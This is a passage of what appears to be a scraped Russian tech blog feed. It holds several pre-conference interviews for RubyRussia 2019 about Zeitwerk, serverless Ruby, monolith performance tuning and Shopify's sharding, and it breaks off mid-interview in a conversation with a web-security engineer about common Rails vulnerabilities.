серверной части компании — Rails, но за кулисами и на всей платформе гораздо больше разных программ и языков. Это частое явление в моей практике.\n\nВремя спойлеров — о чем будет твой доклад на RubyRussia 2019?\n\r\nЯ расскажу о Zeitwerk, новом геме Ruby, который реализует автозагрузку, перезагрузку и активную загрузку для Ruby-проектов. Rails 6 делегирует эти функции Zeitwerk по умолчанию.\n\nКакое твое лучшее впечатление от мира Ruby? Возможно код, технология, знание или отношение?\n\r\nЭто субъективное впечатление, но я считаю, что мир Ruby был удивительно инновационным. Мы говорили об этом с Теренсом Ли некоторое время назад. Для начала, думаю, трудно не согласиться с утверждением, что Rails представляет собой настоящую революцию в веб-разработке. Такие компании, как Heroku, New Relic, Shopify или GitHub были просто революционными. Тем не менее, по моему опыту, люди, которые тяготеют в основном к определенным сообществам, отчасти слепы к тому, что происходит в сообществах по соседству. Я уверен, что найти инновации можно в любом сообществе, будь то Scala, Haskell или даже Brainfuck. Таким образом, если бы я мог глобально наблюдать за каждым сообществом, я бы обнаружил, что сообщество Ruby не является каким-то особенно инновационным, потому что все они инновационны в той или иной мере.\n\nПо твоему мнению, нужно ли Rails что-то вроде стандартной библиотеки компонентов CMS? Как например scaffolds для сборки стандартных частей CMS?\n\r\nНа мой взгляд, это немного не в тему для Rails. Позвольте мне также использовать этот вопрос, чтобы прокомментировать, что scaffolds – это просто доступный способ сделать быструю демонстрацию на конференции или сгенерировать приложение, чтобы проверить что-либо, воспроизвести ошибку, посмотреть, как работает определенная функция. Я никогда не видел scaffolds «в бою», они не подходят для практического использования.\n\nСовременные решения, как правило, неоднородны: мы можем использовать Julia для ML, Java для тяжелых бизнес-нагрузок. Достаточно ли Ruby предоставляет инструментов для языкового взаимодействия? Есть ли инструменты, чтобы сделать это легко?\n\r\nJRuby общается с Java нативно. Можно писать C-расширения для MRI, можно оборачивать C-библиотеки переносимым способом с помощью FFI, а Helix позволяет писать расширения на Rust. Вообще говоря, проще сообщаться с процессами стандартными способами, используя файловую систему, сокеты, HTTP, базы данных, gRPC, брокеры сообщений.\n\nКак многие заметили, Ruby уже не «новый и блестящий». Теперь это больше «старый добрый язык». Студенты, с другой стороны, молоды. Как мотивировать их интерес к изучению Ruby?\n\r\nВ 2000-х я в течение семи лет в свободное время преподавал Perl студентам в университете Барселоны. До моего курса они имели дело преимущественно с C и Java, а я рассказывал о языках сценариев, и Perl использовал в качестве примера. Это было очень весело. Нужна увлекательная программа, которая и обучит программированию, и сделает акцент на том, что доступно с этими языками, и позволит углубиться в конкретный выбор. В случае Ruby, это — от простой реализации ООП, до фантастических возможностей метапрограммирования. Можно показать, например, как работает модель Active Record без единой строки кода в теле класса.\n\r\nЕсть десятки языков программирования, которые можно выбрать. Почему нужно выбирать Ruby, почему не Python или JavaScript, как насчет Clojure, Rust, C++, Go? Все варианты спорны или наоборот — это все отличные варианты. Выберите один, сделайте курс запоминающимся, заставьте студентов изучать программирование, лучшие практики, концепцию идиоматизма, позвольте им научиться проверять документацию, исследовать важные смежные вопросы, выходящие за рамки формализма. Это то, что заставит их расти, подготовит их к профессии фундаментально. На мой взгляд, такова и есть роль университета.\n\nЕсть много разных инструментов для одного и того же: ядро ​​Rails с Active Record, Dry-rb и другие. Нужно ли хвататься за альтернативы? Не делают ли они Рельсы «путями» вместо «пути»?\n\r\nЭто во многом зависит от индивидуальных предпочтений. Следует обязательно изучить и понять комбинации инструментов, слоев, паттернов, которые тебе подходят. Важно помнить, что «путь Rails» не означает «набросать все приложение в папки по умолчанию». Это распространенное заблуждение. Хочется декораторов? Сервисных объектов, POROs? Отлично! Это не идет вразрез с так называемым «The Rails Way». Rails дает набор абстракций по умолчанию и организацию кода, которые, на наш взгляд, достаточно хороши для многих применений, по крайней мере, в качестве отправной точки. А потом, если нравится писать экшены контроллера как однострочники, которые выгружают всю работу в сервис-объекты, можно делать и так. Кому-то это может и не понравиться. Разные люди – разные мозги.\n\nУвидимся на RubyRussia! \n\r\nНапомним, что конференция уже в эту субботу, регистрация еще открыта.\n\r\nБудут не только доклады, но и стенды лучших компаний:\n\r\nОрганизатор — Evrone\r\nГенеральный партнер — Toptal\r\nЗолотой партнер — Gett\r\nСеребряные партнеры — Валарм, JetBrains, Bookmate и Cashwagon\r\nБронзовый партнер — InSales", {"day": "25", "month": "сентября", "time": "09:07"}, {"rate": 6, "views": 1500}], ["28 сентября на конференции RubyRussia Николай Сверчков выступит с докладом Serverless is Ruby Future. Иван Соловьев обсудил в интервью, чем же интересно это направление, и почему рубистам стоит обратить на него внимание.\n\n\n\n\nРасскажи, как ты пришел в Ruby?\n\r\nПрограммировать начал в университете. Вся практика была на C++, но последние курсовые и дипломную работу делал на Ruby. Почему выбрал именно Ruby я точно не скажу, наверное потому, что язык в то время был на волне хайпа. В университете Ruby никто не знал и уж тем более не преподавал. Но после окончания учебы я хотел писать на Java. Тогда мне казалось, что Java это особые, самые крутые разработчики, некая высшая каста программистов, и я хотел быть одним из них. Первое собеседование в жизни было на Java junior, и я его успешно провалил. Зато смог устроиться в компанию, где был нужен Ruby. Может это и к лучшему! Только на пару лет отходил в сторону Elixir. Сейчас работаю в Evil Martians, занимаюсь бэкендом. \n\nТвой доклад о serverless. Как ты начал работать в этом направлении, сложен ли вход в технологию? \n\r\nНачинал изучать в свободное время. У меня была реальная, но не связанная с основной работой задача. Потом начал применять serverless в проектах компании. Порог входа достаточно низкий, думаю, что лишь немного выше, чем у Heroku. Написать свой первый «Hello, world!» будет очень просто – существует куча статей, туториалов, крайне богатая документация у Amazon. А вот потом, конечно, потом будут и сложности. Есть свои подводные камни, о части из них я буду рассказывать в докладе. \n\nСтоит ли новичкам погружаться в serverless и использовать его в продакшене? \n\r\nДумаю, что да! Но не нужно бросаться реализовывать все с помощью serverless. Для начала можно посмотреть на свое приложение и найти в нем небольшой кусок бизнес логики, который вы можете вынести в отдельный сервис. Если этот новый микросервис имеет простой интерфейс общения, то с 99% вероятностью вы сможете реализовать его с использованием той же AWS Lambda. В идеале, если это будет stateless кусок бизнес-логики, тогда вам не придется думать о том, как сохранять результаты, думать об артефактах выполнения вашей лямбда функции. Как пример, хорошей первой задачей может быть рассылка писем. В своем докладе я отдельно буду поднимать вопрос о том, для какого спектра задач лучше всего подходит бессерверная модель вычислений.\n\r\nОсновная рекомендация – отделяйте код бизнес логики от самих лямбд. Это вариация до боли знакомого правила «тонкие контроллеры, толстые модели». Во-первых, так будет проще тестировать. Во-вторых, если в процессе вы поймете, что serverless плохо подходит для вашей задачи, то сможете легко мигрировать на проверенное решение, например, заменить входной слой serverless обычным веб-сервером. В этом плане очень хорош Jets. Это Ruby Serverless фреймворк, позволяющий вам писать приложение, которое из коробки можно деплоить как на AWS Lambda, так и на обычный EC2 инстанс Amazon.\n\nРасскажи подробнее про этот Ruby фреймворк?\n\r\nJets уникален в своем роде. Несмотря на то, что существуют другие serverless фреймворки, заточенные под определенные языки, Jets самый функциональный. Сейчас у него более 2500 коммитов в мастере. Фреймворк использует очень много знакомых конвенций для Ruby разработчика, это такой «Ruby on Rails on Serverless». Но в этом есть и свои минусы. Поскольку при бессерверной модели вычислений вы платите за время выполнения кода, то инициализация и подгрузка большого количества тяжелых зависимостей дорого вам обходится в прямом смысле этого слова. Раскрытию этой теме тоже будет уделено время в моем докладе.\n\nКакие платформы сейчас наиболее распространены для serverless, в чем их отличия, какую из них лучше выбирать? Как я понял, ты сейчас топишь за Amazon Web Services, так как большую часть времени ты говоришь про нее. \n\r\nТы спрашиваешь почему я чаще всего использую слово «лямбда» в нашем разговоре? Я думаю история как с «Karcher» или «Xerox». Есть бренды по имени которых принято называть целую нишу продуктов. В 2014 году Amazon первым предоставил публичный доступ к бессерверной модели вычислений – AWS Lambda. Все остальные: Microsoft с Azure Functions, Google c Cloud Function, IBM c IBM Cloud Functions, до сих пор ментально в роли догоняющих. Хотя рынок serverless быстро развивающийся, а цены на услуги у AWS чаще выше конкурентов. Так что новые релизы, такие как Google Cloud Run, могут перевернуть игру в одночасье. Если же проводить более детальный анализ сравнения платформ, то я бы порекомендовал посмотреть видео Руслана Серкина из DataArt с конференции DUMP 2019.\n\nКак ты думаешь, к каком направлении будет развиваться serverless? \n\r\nО, это самая интересная часть моего доклада! Обойдусь без спойлеров — приходите послушать! Вместо этого могу рассказать про serveless и production. В апреле этого года я был на конференции RubyConfBy в Минске, на которой выступал автор того самого Jets. На афтепати мы обсуждали вопрос развития serverless и почему, при наличии поддержки от крупных игроков индустрии, мы не видим массового распространения лямбда функций. Плюсы модели очевидны, экосистема прозрачна, но широкого доверия со стороны IT-комьюнити нет. В итоге мы пришли к выводу, что сейчас serverless это некий теневой игрок и ситуация чем-то напоминает ту, что была в свое время с Docker. Долго ходили мнения, что Docker в продакшене – это самоубийство. Сейчас же мы видим, что контейнеризация это главный инструмент для дистрибьюции ПО. Я думаю, что в будущем тоже самое ожидает serverless. Все больше и больше людей будут ему доверять. \n\nУбьёт ли serverless монолиты?\n\r\nЭтот вопрос можно перефразировать как «Убьет ли микросервисная архитектура монолиты?». Потому что serverless это идеальный микросервер – он маленький, он stateless и имеет минимальный интерфейс общения с внешним миром. Так же, как микросервисы не убьют монолиты, так и лямбды не убьют монолиты. Все три архитектуры имеют определенный спектр задач, к которым они идеально подходят. И наоборот – есть задачи, где, например, serverless использовать нецелесообразно. Подробности ищите в моем докладе.\n\nЧто делать с vendor lock? Например, ты разработал лямбду для Amazon, но решил переехать на Google.  \n\r\nМиграция между платформами болезненна, если вы не используете какой-то фреймворк, например, serverless, который предоставляет абстрактный API над облачными провайдерами и позволяет вам одну и ту же функцию задеплоить и в Amazon и в Google. Если вы, грубо говоря, все делаете руками, то да, будет немного болезненно. \n\nЧто делать с общими частями лямбд при использовании кода? Например, каким-то common компонентами, каким-то утилитарными функциями и так далее. \n\r\nНа эту тему до сих пор нет best practices. И вопрос снова можно переформулировать в «Как шарить общий код между микросервисами?», потому что смысл тот же. Есть вариант, когда вы держите реиспользуемую логику где-то в shared, а в самих функция подключаете ее. Такой подход хорошо сработает, например, с Go, где на выходе у вас получается один исполняемый файл. Другой вариант – избавиться от связности компонент и допустить дублирование. Наверное, стоит пробовать и смотреть, что больше подойдет. Единственное, что я могу посоветовать – не пытаться делать лямбда функции универсальными. В какой-то момент вам может показаться, что идеальным решением проблемы дублирования кода будет сделать одну убер-функцию. Но со временем вы поймете, что это путь в никуда. Вы получите некую «монолитную версию serverless» со всеми проблемами и первой, и второй архитектуры.\n\nПодробнее обсудим после доклада на RubyRussia! \n\r\nПриходите и вы, регистрация еще открыта, конференция состоится в следующую субботу, 28 сентября.\n\r\nБудут не только доклады, но и стенды лучших компаний:\n\r\nОрганизатор — Evrone\r\nГенеральный партнер — Toptal\r\nЗолотой партнер — Gett\r\nСеребряные партнеры — Валарм, JetBrains, Bookmate и Cashwagon\r\nБронзовый партнер — InSales", {"day": "20", "month": "сентября", "time": "15:18"}, {"rate": 9, "views": 1600}], ["Несмотря на огромное количество материалов по теме оптимизации монолита, часто хочется убежать от глубоко изучения вопроса и попробовать угадать, как сделать приложение быстрей или компактней. Хорошая новость: принцип Парето работает и здесь. На конференции RubyRussia 28 сентября Юлиан Покровский расскажет о необходимых приемах. А пара тизеров будет в этом интервью Юлиана с Григорием Петровым. \n\n\n\nЧем ты занимаешься в мире IT, Ruby, твои интересы, экспертиза?\n\r\nЯ работаю в Купибилете. В проекте я писал на Ruby и на Rust бекэнд для поиска, бронирования и покупки авиабилетов. Меня интересует широкий спектр того, что происходит в IT: от компиляторов до распределенных систем. Не очень интересуюсь машинным обучением и фронтендом, но может когда-нибудь доберусь и туда.\n\nРасскажи, о чем твой доклад? \n\r\nЯ расскажу о нашем опыте оптимизации 8-летнего монолита и покажу, что это очень просто и выгодно для всех. И есть возможность выделить для этого время в спринте. Получить прирост производительности можно разобравшись всего с несколькими простыми приемами и инструментами, которые не требуют Rails и подходят не только для веб-приложения. Расскажу о тех материалах, которыми мы руководствовались, когда решали свои проблемы. Посмотрим на stackprof, rbspy, heapy, а также почему тривиальные изменения настроек операционной системы, смена аллокатора, могут принести невероятную пользу. И почему плохо применять советы из интернета не проводя замеры на своем приложении. \n\nЕсть такая городская легенда, что если сравнивать языки большой четверки (Ruby, Python, JavaScript и PHP), то на первом месте у нас JS, потому что там await и jit, на втором PHP, потом Python, а Ruby занимает почетное 4-е место.Что скажешь, так ли это?\n\r\nЯ не склонен отрицать то, что Ruby на многих бенчмарках показывает себя не с лучшей стороны. Но однозначно не правильно говорить, что в любой ситуации он будет на последнем месте. Если взглянуть шире, то Ruby — это некий языковой стандарт. Мы можем говорить о TruffleRuby, о JRuby, о MRI, о вопросах производительности. Это очень индивидуальные вещи. Все зависит от того, как вы написали код и что вы хотели получить. В каких-то случаях Ruby будет быстрее всех, в каких-то Python, недаром же он популярен в data science, иногда JavaScript окажется наиболее быстрым. \n\nНасколько сейчас экосистема Ruby предлагает быстрые, нативные способы решения популярных задач? \n\r\nЯ могу трактовать вопрос по-разному. Можно сказать о том, как сейчас в Ruby обстоят дела с С-экстеншенами. Если сузить вопрос до этого, то все мы знаем: OJ для сериализации JSON, PostgreSQL Driver, Ruby Driver for MySQL и многие другие вещи написаны на С. Вопрос в том, насколько для меня лично это хорошо или плохо. Для того чтобы jit компиляторы, которые, возможно, являются будущим Ruby, хорошо оптимизировали код, нам нужно больше писать на Ruby и меньше обращаться к экстеншенам. Чтобы сам компилятор мог делать это. TruffleRuby подходит к этому вопросу по-другому. Насколько я помню, он позволяет делать оптимизацию между разными языками, поэтому называется polyglot vm. Опять же, насколько успешно он это делает, я сказать не готов. И сам TruffleRuby — пока достаточно молодой проект.\n\nКакие подвижки в мире Ruby сейчас есть для асинхронного программирования?\n\r\nНа мой взгляд, за последнее время массового движения в сторону асинхронного Ruby не произошло. Есть какие-то отдельные проекты: и проверенная EventMachine, и проект Сэма Уильямса, async, точнее целая группа проектов, в которой на основе nio4r делается новая реализация асинхронности, более простая, чем EventMachine или Celluloid. Но в целом история, хоть и не стоит на месте, скорее ходит по небольшому кругу. И за его пределы пока ничего не вышло. Посмотрим, что будет дальше. \n\r\nЯ по-прежнему вижу много использования concurrent-ruby на основе потоков. Это не такой плохой вариант для языка с умеренно производительным рантаймом — использовать потоки, которые освобождаю GVL (глобальный лок) и позволяют делать параллельные HTTP запросы или какие-то другие I/O операции одновременно. Может быть, файберы в будущем будут более популярны. Они сейчас легли в основу библиотеки из группы dry — dry-effects. Это как раз позволяет делать какие-то параллельные операции на основе файберов. Не синхронно, но и не совсем асинхронно — уже наполовину асинхронно. \n\nНа конференцию прилетает Мацумото-сан, автор Ruby. Как ты думаешь, что тебе было бы интересно с ним обсудить за чашкой кофе или бокалом саке на афтепати? \n\r\nЯ уже виделся с Мацумото в Москве в 2016 году. Я помню, он тогда сказал что если конференция продолжит называться RailsClub он больше не приедет. \n\nДа, и ее переименовали в RubyRussia, это более широкое название. И он снова у нас в гостях.\n\r\nЯ тогда думал, кто победит, он или RailsClub. Победил Мацумото. Я бы спросил, как ему удалось так поставить вопрос, что переименовали самый большой ивент по Ruby в России.\n\nЯ думаю, у тебя будут все возможности задать этот вопрос лично. Какое ты видишь будущее у Ruby? Что тебе не хватает в языке, экосистеме?\n\r\nПредсказание судьбы языка программирования — дело неблагодарное, потому что пока никто не угадал, как будут развиваться события ни для одного языка. Я могу ошибаться, но Ruby сейчас не самый популярный выбор для новых проектов. Многие слышали «Ruby мертв, а Rails устарели»: медленно, не асинхронно, не параллелится и у него в целом куча проблем. Влияет ли это на количество новых проектов на Ruby? На мой взгляд — однозначно да. Их становится меньше и будет становиться еще меньше. Но старые проекты остаются. На мой взгляд, в таком ключе Ruby нужны инструменты для поддержки сложных, массивных приложений. В таких ситуациях неплохо взглянуть на такие дополнения, как система типов. Многие предпочитают поддерживать большие приложения и развивать их, как мы видим на примере JavaScript с Flow и TypeScript, в сторону типизации, которая немного упрощает рефакторинг и контроль за ситуацией в сложном проекте. Возможно, нужно делать более богатую экосистему библиотек, которую нужно использовать независимо, как, например, dry-rb. Где человек может выбрать, что ему нужно для валидации, что для построения эффектов в какой-то подсистеме. Возможно, ему нужны контейнеры внедрения зависимостей, которые решают определенные проблемы. Экосистема должна двигаться в эту сторону. В сторону энтерпрайз разработки и поддержки больших и сложных систем.\n\nОбсудим на RubyRussia! \n\r\nПриходите и вы, регистрация еще открыта.\n\r\nБудут не только доклады, но и стенды классных компаний:\n\r\nОрганизатор — Evrone\r\nГенеральный партнер — Toptal\r\nЗолотой партнер — Gett\r\nСеребряные партнеры — Валарм, JetBrains, Bookmate и Cashwagon\r\nБронзовый партнер — InSales", {"day": "17", "month": "сентября", "time": "11:11"}, {"rate": 5, "views": 1300}], ["На конференции RubyRussia Кир Шатров расскажет об архитектуре Shopify. Как одного из самых больших и нагруженных в мире приложений на Rails поддерживает рост бизнеса на протяжении 10 лет, не переходя на микросервисы, Elixir и другие популярные альтернативы? В традиционном интервью перед конференцией вопросы Киру задал Анатолий Зайцев, разработчик компании Evrone.\n\n\n\nРасскажи, как ты начал карьеру?\n\r\nКак и многие, я занимался программированием еще в школе. Делал сайты на WordPress за 200$ каким-то знакомым. Узнал о Ruby on Rails и понял, что те задачи, которые на PHP занимают часы и дни, можно решать гораздо быстрее. Мне показалось, что стоит запрыгнуть на этот поезд: я купил книгу по Rails и начал изучать по шагам. Многие шаги не работали, и я забросил занятия. Вернулся через год, попробовал идти по онлайн-туториалам, и тогда все получилось. Только потом я понял, в чем была проблема: пока книгу писали, переводили, печатали и везли в магазины, прошел год, а то и полтора. Rails за это время сильно изменились. Естественно, что инструкции уже не работали. А когда я смог читать материалы онлайн и на английском, то легко вошел в Rails и сделал первые хобби-проекты. \n\r\nПотом я познакомился с Олегом Балбековым, основателем конференции RailsClub, которая теперь называется RubyRussia. Так я попал в компанию Evrone, где проработал почти четыре года и благодаря классным и умным коллегам смог хорошо вырасти. Evrone здорово помог начать: была возможность делать опенсорс, расти. Потом я работал в Evil Martians, делал проекты уже другого масштаба — EBay, Groupon, Gett. У марсиан необычная культура опенсорса и экспериментов, которая бывает далеко не во всех командах. В перерывах между проектами или прямо на проектах у людей есть возможность заниматься опенсорсом. Именно так получается развивать Autoprefixer, AnyCable и не только. Как результат — есть о чем рассказать на конференциях. Я выступал на RailsClub в России, RailsConf в Штатах и на огромном количестве других крупных и не очень мероприятий. И из-за того, что я так много выступал, меня заметили и пригласили работать в Shopify. \n\nРасскажи, как ты переехал в Канаду и как Shopify помогал в процессе?\n\r\nЭто получилось не сразу, были сложности с релокацией: в тот момент в Канаде правительство устроило забастовку и просто некому было апрувить или реджектить визы, но все разрешилось. Это был 2013-2014 год, Shopify очень не хватало разработчиков, и они начали перевозить инженеров со всего мира к себе. Этот процесс активно идет и сейчас. Сегодня масштаб такой, что совместно с правительством Канады Shopify разработал программу, которая позволяет получить рабочую визу за три недели. По такой схеме переезжает около ста человек в год. При этом, попасть на работу могут не только опенсорсеры и известные спикеры. Нам нужны разработчики, которые впишутся в команду и будут писать хороший код.\n\nПолучается, что попасть в Shopify возможно и без огромного послужного списка, если ты хорошо и профессионально делаешь свое дело?\n\r\nДа, это так. А еще важно уметь рассказывать о своей работе. Кто-то скажет: «я пофиксил баг и обновил версию Ruby, добавил новую фичу». А можно рассказать о том же, но с точки зрения развития бизнеса, решения его проблем. Еще на собеседованиях в такие компании важно, какие нововведения ты внедрял на работе, как участвовал в жизни сообщества: не только писал код, но и, например, был волонтером, помогал организовать Ruby-конференцию. \n\nЧем конкретно ты сейчас занимаешься в Shopify?\n\r\nЗадачи разные. Конечно, я пишу код. Но много моего времени уходит и на организацию процессов. Например, в конце ноября будет Black Friday. Для всех, кто работает в e-commerce, это самое большое событие в году. Мы начинаем готовиться еще в августе: нужно договориться с разными командами о выпуске новых фич, договориться с вендорами и провайдерами. А после того, как черная пятница пройдет, мы входим в фазу, когда начинаем делать что-то новое. Тогда мне приходится надевать шляпу архитектора.\n\r\nЯ для себя решил, что мне комфортно заниматься разными вещами и пробовать новое, не только писать код. Но я знаю людей, которым больше всего нравится программировать, и они не хотели бы общаться с участниками тридцати команд и участвовать в организации процессов. В Shopify все гибко, внутри компании люди могут найти то, чем нравится заниматься именно им.\n\nShopify — большая платформа. Сколько у вас клиентов?\n\r\nОфициальная цифра — 800 000 активных магазинов. Это не просто регистрации (их намного больше), это именно живые бизнесы. \n\nЧто Shopify как платформа дает клиентам?\n\r\nНаш фокус — это малый и средний бизнес. У малого бизнеса часто есть только идея: они еще не знают, как будут продавать. Необходимо решить много проблем: учет товаров, организация платежей и доставки, выбор партнёров для всего этого. Наша задача — сохранить время предпринимателей, чтобы они как можно меньше заботились о рутинных проблемах. Мы берем эту работу на себя.\n\r\nЕсли ты живешь в стране, где у Shopify полная поддержка, значит, что тебе не нужно выбирать платежную систему, ведь есть Shopify Payments. Просто вводишь свои налоговые данные, и все будет работать. Та же ситуация с отправкой товаров: ты печатаешь стикер, клеишь его на посылку и отправляешь. Не нужно покупать марки, оплачивать доставку, Shopify автоматически интегрируется с почтами. Есть складские сервисы: ты можешь отправить свои товары на склад Shopify, а сложные алгоритмы вычисляют, на каком складе его хранить, как обеспечить доставку клиентам за один день. Это позволяет малому бизнесу конкурировать с Amazon и EBay.\n\nЯ некоторое время работал над переносом проекта на вашу платформу. У этого магазина были свои inventory, товары, клиентская база. Все работало достаточно удобно: есть экспорт\\импорт, даже сторонние платежи подключаются в два клика. У вас огромная инфраструктура. Правильно ли я понимаю, что большинство библиотек (shopify api, shopify app, shopify co), написано на Ruby и Rails?\n\r\nДа, это так. \n\nRuby часто ругают за плохую работу с большим количеством данных. Когда нужно масштабироваться, часто Ruby не хватает. Почему в Shopify используется именно этот стек технологий?\n\r\nКомпания началась с парня по имени Тоби, который увлекался сноубордами. Двенадцать лет назад он решил написать свой магазин для продажи этих сноубордов. Делать это на PHP, Java и XML ему было не интересно. Тогда друг Дэвид показал ему свой новый классный фреймворк, который позволял быстро создавать веб-приложения. Фреймворк назывался Ruby on Rails, и на нем Тоби построил свой магазин для сноубордов. Ему понравился язык и идеи фреймворка, Тоби стал одним из первых контрибьюторов в Rails. На тот момент у Rails еще не было даже централизованного git репозитория! Люди просто обменивались новыми версиями. Так Тобиас Лютке и Давид Хейнемейер Ханссон начали работать над Rails. И скоро Тоби понял, что гораздо круче запустить не свой магазин сноубордов, а целую платформу для других магазинов.\n\r\nТобиас Лютке — наш фаундер, он все еще является СЕО. Его можно встретить в офисе, все эти пятнадцать лет он работает над Shopify. Компания началась с Rails, и в ней работают люди, которые искренне любят этот фреймворк. Они видят, как быстро смогли построить на Rails то, что они хотели. Видят, как быстро разработчики могут что-то делать, экспериментировать и доставлять в продакшен. \n\r\nЯ не думаю, что в компании когда-то серьезно рассматривали варианты перехода на что-то другое. На мой взгляд, веб-приложения все равно будут упираться в базу. Сходить куда-то, взять что-то, переформатировать это, склеить шаблон, положить в кэш и потом отдать результат. На это уходит большая часть времени. Rails прекрасно подходит для рендеринга страниц за 100-300 миллисекунд. Конечно, если нужно рендерить за 8-10, то придется выбрать что-то более быстрое, например, Go. В компании есть отдел, который занимается инфраструктурой, масштабированием и исследованием направлений роста с нашими текущими технологиями.\n\nКак решаете проблемы с масштабированием и высокими нагрузками?\n\r\nУ нас очень типичный стек: Rails, MySQL, Memcache, Redis. Наверняка, ты работал с таким на многих проектах. Где-то в 2014 году, когда компании было 10 лет, мы поняли, что все необходимое уже не лезет в одну базу данных. Можно покупать более мощное железо для сервера MySQL и расти вертикально, но всему есть предел.\n\r\nТогда мы решили, что шардинг поможет расти горизонтально. Как SaaS, где данные одного магазина не пересекаются с данными другого, мы можем организовать шардинг довольно просто. Никогда не придется делать join между двумя разными магазинами. С нашей моделью шардинга, на одном шарде живут тысячи магазинов разного размера и разной нагрузки. Шард включает в себя не только сущность базы данных, а также свой Redis, свой Memcache и так далее. За счет полной изоляции между шардами мы разбиваем весь Shopify на сотни маленьких Shopify. Каждый может хостится в отдельном регионе, датацентре, провайдере, в отдельной юрисдикции. Если у тебя 100 шардов, и на одном из них что-то упало, это затронет всего 1% клиентов. Это очень немного, если сравнить с ситуацией, когда при падении одного ресурса на всех падает все.\n\r\nЭто и есть горизонтальное масштабирование с помощью шардинга. И шардинга не только одного, самого главного ресурса (базы данных), а изоляции всех компонентов, которые используют магазины. Дальше появляются интересные проблемы. Например, на каком-то шарде больше магазинов, где много трафика, а на каких-то меньше. На каких-то больше нагрузки, а на каких-то меньше. Приходится решать проблемы балансировки магазинов внутри шарда. \n\nВы мигрируете магазин из одного шарда в другой?\n\r\nКогда нужно решить такие проблемы — да. У нас есть тулинг, который я подробно опишу в докладе. Будет рассказ о том, как мы пришли к этой схеме, как работает шардинг, как такой подход может применяться не только к нашему бизнесу, но и к другим. Нам пришлось самим разработать тул для миграции магазинов между шардами и датацентрами. В основном, миграция нужна для ребалансировки. \n\r\nА дальше становится действительно интересно. Пять лет назад мы инвестировали в подход, когда изолированный инстанс Shopify может быть запущен изолировано. Сейчас у нас появляются клиенты, которым нужно иметь платформу в определенной юрисдикции. Эта архитектура позволяет нам построить инстанс, который изолирован только на одну точку. \n\nНа конференцию приезжает Yukihiro Matsumoto. Что бы ты хотел у него спросить? \n\r\nСначала опишу контекст, чтобы мой вопрос был более понятен. Насколько я знаю, разработка Ruby — это несколько индивидуальных личностей, меньше десяти человек, среди них не более пяти ключевых. Большинство — японцы, которые очень давно этим занимаются. Кто-то из них может в одиночку реализовать такую мажорную фичу, как, например, guild или аннотации типов. Все завязано на этих людей. И если один человек, которого спонсирует Cookpad или Heroku, реализует ключевую фичу определенным образом, то именно такой она и будет. Но есть bus factor.\n\r\nНа мой взгляд, самые большие продвижения в Ruby, которые происходили за последние пару лет, были инициированы большими компаниями, так как большие проблемы невозможно решить в одиночку. Например, Stripe нанимает людей, которые занимаются разработкой типизированных языков программирования, и дает им год на исследование. Так получается Sorbet, который является не просто способом тайп-чекинга, а целой парадигмой, его можно масштабировать, его документация построена на опыте сотен человек внутри Stripe. И таких примеров масса. Oracle спонсирует Truffle, и несколько людей работают над созданием виртуальной машины следующего поколения, переиспользуя часть виртуальных машин, которые уже были разработаны на протяжение десятков лет, десятками умных людей внутри Oracle.\n\r\nЯ бы спросил Маца о том, насколько он верит в реалистичность решения больших проблем Ruby силами небольшой группой индивидуальных контрибьюторов. Насколько такая модель может конкурировать с примерами, когда проблемы решались при помощи крупного спонсора.\n\nОбсудим на конференции!\n\r\nНапомним, что она состоится 28 сентября в Москве, все подробности и регистрация на сайте.\n\r\nНас поддерживают:\n\r\nОрганизатор — Evrone\r\nГенеральный партнер — Toptal\r\nЗолотой партнер — Gett\r\nСеребряные партнеры — Валарм, JetBrains, Bookmate и Cashwagon\r\nБронзовый партнер — InSales", {"day": "16", "month": "сентября", "time": "10:02"}, {"rate": 14, "views": 4000}], ["На конференции RubyRussia будет много докладов о том, как писать код и как делать это лучше других. Но если продукт, который выпускает ваша компания, небезопасен, то это может привести к большим проблемам. Григорий Петров обсудил эту важную тему с Михаилом Пронякиным из компании «ОНСЕК», разработчик комплексной платформы «Валарм».\n\n\nРасскажи, чем ты занимаешься и как используешь Ruby?\n\r\nКогда-то, давным-давно я работал специалистом в области информационной безопасности. Делал что-то вроде пентестов веб-приложений и различных физических устройств. Параллельно с этим занимался системным программированием на языке C. В то время, как и сейчас, был популярен фреймворк Metasploit, который можно было расширять собственными модулями поиска и эксплуатации уязвимостей. Он был написан на Ruby — так началось мое знакомство с этим языком. Затем я перешел работать в компанию «Онсек», где сначала ускорял некоторые критические части бэкенда проекта путем переписывания кода с Ruby на C, а потом стал писать новую функциональность только на Ruby. Деятельность нашей компании связана с информационной безопасностью, мы делаем «Валарм» — платформу для защиты и тестирования веб-приложений (и не только). Получается, что я одновременно и Ruby-разработчик, и специалист по информационной безопасности.\n\nТвой доклад будет связан с этой темой. Расскажи подробнее. \n\r\nRoR дает программисту большие возможности по написанию кода, но существуют и неочевидные моменты, которые могут привести к проблемам безопасности. На конференции я расскажу о типовых уязвимостях Ruby-приложений и приведу практические примеры, которые помогут не допустить ошибок.\n\nНа твой взгляд, как сейчас Rails в плане обеспечения безопасности?\n\r\nВ философии Ruby и Rails существует такое понятие как «приоритет соглашения над конфигурацией». Если в соглашении все продумано, то никаких проблем с безопасностью и не появится. Но если вдруг возникает ситуация, что ты можешь по умолчанию написать уязвимый код, то это уже может стать причиной серьезных проблем. Особенно у начинающих разработчиков, которые только начали изучать Rails и даже не задумываются про безопасность своего кода. Если смотреть в прошлое, то раньше с безопасностью везде было хуже, чем сейчас. Это касается не только Ruby, но и других языков и фреймворков. С каждым годом фичи безопасности интегрируются во фреймворки все больше и глубже. Например, в Rails уже из коробки везде есть CSRF токены, что очень хорошо. И все это работает под капотом, но если ты не знаешь как и хочешь сделать что-то кастомное, то безопасность приложения может быть нарушена. \n\nЕсли рассматривать уязвимости, то их можно очень грубо поделить на 2 вида: это уязвимости в runtime и уязвимости самого языка. Когда-то давно в Python была печальная история — оказалось, что в Python хеш для словаря рассчитывается без соли. Можно было злонамеренно спровоцировать бесконечное количество коллизий. В результате словари переполнялись, и сервера умирали от нескольких мегабайт атакующих запросов. Скажи, в мире Rails, по твоему опыту, сколько уязвимостей приходится на сам Ruby, а сколько уязвимостей приходится на рельсы?\n\r\nЕсли рассматривать тему уязвимостей, то она намного более обширная, чем просто Ruby и Rails. Например, у нас есть nginx. Если его неправильно сконфигурировать, то можно будет просто прочитать некоторые файлы с сервера и получить секрет Rails приложения. И все, приложение взломано – делай, что хочешь. Нужно понимать, что безопасность не ограничивается одним языком и фреймворком — есть среда, где это исполняется, среда, где это собирается, и еще миллион разных нюансов.\n\nА по количеству можно ли как-то прикинуть, где находится больше уязвимостей? Вне Ruby и 